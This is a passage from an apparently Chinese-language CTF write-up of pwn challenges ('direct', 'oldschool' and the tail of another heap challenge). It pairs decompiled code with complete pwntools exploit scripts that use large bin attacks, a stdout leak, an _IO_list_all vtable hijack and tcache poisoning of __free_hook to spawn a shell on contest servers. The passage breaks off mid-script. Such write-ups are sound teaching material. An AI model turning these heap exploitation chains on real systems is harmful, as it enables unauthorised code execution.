)</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>其次注意到binary是没有<code>show</code>功能的，所以很容易想到要打<code>stdout</code>来leak libc。</p>
</li>
<li><p>在没有fastbin的情况下，那么可以利用这个off by null完成unlink attack，形成chunk overlap，可以伪造出large bin，来进行large bin attack。因为我们知道在将一个比原large bin的size要大的unsorted bin链入large bin的时候，会使得<code>large bin-&gt;bk-&gt;fd = unsorted bin</code>以及<code>large bin-&gt;bk_nextsize-&gt;fd_nextsize = unsorted bin</code>，也就是能达到同时向两个任意地址写入堆块地址的目的。</p>
</li>
<li><p>同时注意到只要控制<code>stdout</code>的<code>_flags = 0xXXXXY800</code>（Y为奇数）以及<code>_IO_write_base &lt; _IO_write_ptr</code>即可触发输出相应缓冲区数据效果，从而leak出libc，所以采用控制unsorted bin的地址的低2 bytes（Y由于ASLR而随机）为<code>Y800</code>然后通过<code>large bin-&gt;bk-&gt;fd</code>写入，以及错位写<code>_IO_write_base</code>的低字节为<code>\x00</code>的方法。</p>
</li>
<li><p>而由于large bin的<code>fd_nextsize</code>和<code>bk_nextsize</code>都是堆地址，我们要改到<code>stdout</code>的地方只能通过partial write，所以还要稍微做一下堆的排布，使得两个unsorted bin的<code>bk</code>分别先后占住large bin的<code>bk_nextsize</code>和<code>bk</code>的位置。</p>
</li>
<li><p>leak出libc之后，再通过一次large bin attack覆盖<code>_IO_list_all</code>为可控的堆地址，这样就能劫持<code>_IO_FILE</code>的vtable写入onegadget，在binary进行<code>exit</code>的时候触发来getshell。</p>
</li>
<li><p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">stdout = <span class="number">0x3c5620</span></span><br><span class="line">_IO_list_all_offset = libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 0</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 3</span></span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 4</span></span><br><span class="line">        add(<span class="number">0x2E8</span>) <span class="comment"># chunk 5</span></span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 6</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">3</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x3E</span> + <span class="string">'\n'</span>) </span><br><span class="line">        edit(<span class="number">4</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x1F</span> + p64(<span class="number">0x8F0</span>)) <span class="comment"># off by null</span></span><br><span class="line">        edit(<span class="number">5</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x2E</span> + <span class="string">'\n'</span>) </span><br><span class="line">        edit(<span class="number">6</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x1F</span> + <span class="string">'\n'</span>) </span><br><span class="line">        delete(<span class="number">0</span>) </span><br><span class="line">        delete(<span class="number">5</span>) <span class="comment"># unlink attack</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 0</span></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>) <span class="comment"># unsorted bin</span></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 5 (gap)</span></span><br><span class="line">        add(<span class="number">0x18</span>) <span class="comment"># chunk 7 (gap)</span></span><br><span class="line">        add(<span class="number">0x2D8</span>) <span class="comment"># chunk 8 (use all)</span></span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        delete(<span class="number">8</span>)</span><br><span class="line">        add(<span class="number">0x2D8</span>) <span class="comment"># chunk 3 (get large bin)</span></span><br><span class="line"></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x108</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x1E8</span>) <span class="comment"># chunk 8 (use all)</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0x28</span>) <span class="comment"># chunk 9 (use all)</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">4</span>, <span class="string">"A"</span> * <span class="number">0xE8</span> + p64(<span class="number">0x21</span>) + <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x421</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        delete(<span class="number">3</span>) <span class="comment"># unsorted bin</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># libc_base = _base(_libc)</span></span><br><span class="line">        target = <span class="number">0x5620</span> + <span class="number">0x5000</span><span class="comment"># + libc_base</span></span><br><span class="line">        edit(<span class="number">9</span>, p64(<span class="number">0</span>) + p16(target - <span class="number">0x10</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p16(target - <span class="number">0x20</span> + <span class="number">0x19</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">0x3D8</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">"\x00"</span> * <span class="number">0x18</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c36e0</span></span><br><span class="line">        _IO_list_all = libc_base + _IO_list_all_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line">        heap_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"fail"</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># large bin attack again</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + \</span><br><span class="line">     p64(<span class="number">0x401</span>) + p64(libc_base + <span class="number">0x3C4F68</span>) + p64(_IO_list_all - <span class="number">0x10</span>) + \</span><br><span class="line">     p64(heap_base + <span class="number">0x300</span>) * <span class="number">2</span> + <span class="string">'\n'</span>) </span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">"A"</span> * <span class="number">0xE0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x3E8</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget) * <span class="number">28</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x411</span>)</span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">"\x00"</span> * <span class="number">0xA8</span> + p64(heap_base + <span class="number">0x7E0</span> - <span class="number">0xF0</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
<li><p>首先这个<code>edit</code>对<code>offset</code>的检查不够严格，所以可以向任意负偏移的位置写值：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)open_status;</span><br><span class="line">  <span class="keyword">if</span> ( open_status )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    result = choice();</span><br><span class="line">    v3 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = chunk_array[result];</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Offset: "</span>);</span><br><span class="line">        v4 = choice();</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Size: "</span>);</span><br><span class="line">        v1 = choice();</span><br><span class="line">        nbytes = v1;</span><br><span class="line">        v2 = v4 + v1;</span><br><span class="line">        result = chunk_size[v3];</span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= (__int64)result )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">"Content: "</span>);</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(chunk_array[v3] + v4), nbytes);</span><br><span class="line">          result = puts_(<span class="string">"Done!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 那么可以轻易的伪造unsorted bin。</p>
</li>
<li><p>但是同时注意到这也是一个”无 leak“的题目，因为没有常规的<code>show</code>功能，而且这个时候因为没有<code>puts</code>，所以通过<code>stdout</code>去leak的思路是行不通的。</p>
</li>
<li><p>这个时候关注一下这个<code>opendir</code>和<code>readdir</code>，<code>opendir</code>会在对上开辟一块<code>0x8040</code>大小的chunk，一开始内容是空的，而在调用完<code>readdir</code>之后会发现这个chunk被写入了很多内容，比较明显的就是包含了当前目录下所有的文件名。这个时候查一下<code>readdir</code>到底干了什么:</p>
<p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/struct.png" alt="struct"></p>
<p> 大概就是<code>readdir</code>会返回一个指向当前文件信息的结构体，而在<code>close file</code>功能的<code>result = puts_((const char *)(v1 + 19));</code>也可以看出，这个<code>+19</code>正好就是指向文件名了，也就是<code>d_name</code>。</p>
</li>
<li><p>那么leak的思路就有了，就是利用unsorted bin-&gt;fd或bk，将某个结构体的<code>d_name</code>给覆盖掉，那么在某次调用<code>close file</code>打印文件名的时候，就会把这fd或者bk给打印出来，从而leak出libc。</p>
</li>
<li><p>接下就是直接<code>tcache poisoning</code>打<code>__free_hook</code>为<code>system</code>即可。</p>
</li>
<li><p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">""" N0p / AAA """</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'106.14.214.3'</span>, <span class="number">1912</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, offset, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Offset: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opendir</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readdir</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0xF8</span>)</span><br><span class="line"></span><br><span class="line">opendir()</span><br><span class="line">readdir()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">-8</span>, <span class="number">8</span>, p64(<span class="number">0x4E1</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="number">-0x7F88</span>, <span class="number">0x28</span>, p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xB8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">-0x7FA8</span> + <span class="number">3</span>, <span class="number">5</span>, <span class="string">'AAAAA'</span>)</span><br><span class="line">readdir()</span><br><span class="line">readdir()</span><br><span class="line">readdir()</span><br><span class="line">p.recvuntil(<span class="string">"AAAAA"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">-0x100</span>, <span class="number">8</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0xF8</span>)</span><br><span class="line">edit(<span class="number">11</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0xF8</span>)</span><br><span class="line">edit(<span class="number">12</span>, <span class="number">0</span>, <span class="number">8</span>, p64(libc_system))</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h1><p>这题当时是队里大佬们做的，我只是赛后又做了一遍。</p>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
<li><p>题目给的是源代码，编译方式<code>Ubuntu 18.04, GCC -m32 -O3</code>，直接看源码会发现没有问题，之前pwnable以及中科大的HackerGame上也有过直接给源码的，反倒是编译后洞更明显。</p>
</li>
<li><p>那么直接编译之后，就会发现，<code>mmap_edit</code>有逻辑被优化掉了：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">4</span> * v2 &gt;= <span class="number">0</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(g_ptr + <span class="number">4</span> * v2) &gt; <span class="number">0xEFFFFFFF</span> )</span><br><span class="line">&#123;</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"Value: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">"%u"</span>, &amp;v3) != <span class="number">1</span> )</span><br><span class="line">LABEL_3:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *(_DWORD *)(g_ptr + <span class="number">4</span> * v0) = v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 也就是说check不存在了，可以直接写到高地址的libc处了。</p>
</li>
<li><p>那么首先填满tcache，然后拿到unsorted bin，利用unsorted bin来leak出libc地址。</p>
</li>
<li><p>之后及直接利用<code>mmap_edit</code>写<code>__free_hook</code>为<code>system</code>即可。</p>
</li>
<li><p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'106.14.214.3'</span>, <span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"6"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Where do you want to start: "</span>, str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 